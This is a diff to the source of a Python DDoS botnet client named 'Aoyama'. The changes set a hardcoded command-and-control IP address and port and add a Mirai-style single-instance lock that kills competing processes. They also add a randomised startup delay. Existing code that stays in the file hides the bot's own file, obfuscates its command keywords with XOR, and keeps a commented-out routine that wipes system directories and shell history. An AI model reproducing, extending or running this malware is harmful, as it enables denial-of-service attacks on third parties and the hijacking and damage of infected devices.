@@ -5,7 +5,7 @@
 #      Added new stuff like daemon, slowloris...  #
 #              Good Luck have Fun                 #
 ###################################################
-#--  Aoyama version v1   --#
+#--  Aoyama version v1.1 --#
 # Added xor encode traffic #
 # Added auto enable ssl    #
 # Improved dos attack code #
@@ -20,10 +20,11 @@ import time
 import random
 import threading
 import base64 as b64
-
-cnc   = str("127.0.0.1")#your cnc ip
-cport = int(1337)#your cnc port
-key   = "asdfghjkloiuytresxcvbnmliuytf"#xor key, don't edit it if u don't know wtf is this
+#config
+cnc                  = "140.11.32.17"#your cnc ip
+cport                = 1337#your cnc port
+single_instance_port = 42026#You should knew this if u used mirai.
+key                  = "asdfghjkloiuytresxcvbnmliuytf"#xor key, don't edit it if u don't know wtf is this
 
 useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
 			"Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
@@ -168,7 +169,7 @@ def handle(sock):
 		if data[0] == '!':
 			try:
 				command = data.split()
-				print(command)
+				#print(command)
 				if command[0] == xor_dec('QBAH',key):#encoded keywords: !cc
 					if attack != 0:
 						stop = True
@@ -229,10 +230,10 @@ def daemon():#daemon
 		os._exit(0)
 	sys.stdout.flush()#Refresh buffer
 	sys.stderr.flush()
-	sys.stdin = open("/dev/null")#off the stdin,stdout,stderr, indeed no need.
-	sys.stdout= open("/dev/null")#windows can't use this method, only can use pyinstaller's option '--noconsole'
-	sys.stderr= open("/dev/null")
-'''
+	sys.stdin.close()#off the stdin,stdout,stderr, indeed no need.
+	sys.stdout.close()#windows can't use this method, only can use pyinstaller's option '--noconsole'
+	sys.stderr.close()
+'''These function haven't need to use
 def clean_device():#don't use it if u don't want be detected in dbg
 	os.system("rm -rf /tmp/* /var/tmp/* /var/run/* /var/*")
 	os.system("rm -rf /bin/netstat")
@@ -245,6 +246,36 @@ def clean_device():#don't use it if u don't want be detected in dbg
 	os.system("rm -rf ~/.bash_history")
 	os.system("history -c")
 '''
+def kill_port(port):#search in google
+	# find pid
+	if os.name == "nt": 
+		result = os.popen("netstat -aon | findstr " + str(port))
+		text = result.read()
+		gpid = text.strip().split(' ')[-1]
+		# kill pid
+		result = os.popen("taskkill -f -pid "+ str(gpid)+" >nul 2>&1")
+	else:
+		os.system("fuser -k -n tcp "+str(port))#using 'fuser' to kill port
+
+def single_instance():
+	try:
+		s = socket.socket()
+		s.bind(('127.0.0.1',single_instance_port))
+		s.listen(1)
+		while True:
+			global kill
+			if kill:
+				break
+			a, addr = s.accept()
+			a.close()
+	except:
+		try:
+			kill_port(single_instance_port)
+			single_instance()
+		except:
+			os.system("kill "+os.getppid())
+			os._exit(0)
+
 def conn():
 	if len(sys.argv) == 1:#i use 'python client.py debug' to check command
 		if os.name != "nt":
@@ -253,6 +284,9 @@ def conn():
 			#clean_device()
 		else:
 			os.system("attrib +s +a +h "+sys.argv[0])#hide the file
+	global kill
+	kill = False
+	threading.Thread(target=single_instance,daemon=True).start()#only can used in python3
 	while True:#magic loop
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -265,6 +299,11 @@ def conn():
 
 			signal = handle(s)
 			if signal == 1:
+				if os.name != "nt":
+					sys.stdin  = open("/dev/stdin")#off the stdin,stdout,stderr, indeed no need.
+					sys.stdout = open("/dev/stdout")#windows can't use this method, only can use pyinstaller's option '--noconsole'
+					sys.stderr = open("/dev/stderr")
+				kill = True
 				break
 
 		except:
@@ -300,4 +339,5 @@ def xor_dec(string,key):
 	return "".join( string )
 
 if __name__ == '__main__':
+	time.sleep(30+random.randint(0,60))
 	conn()
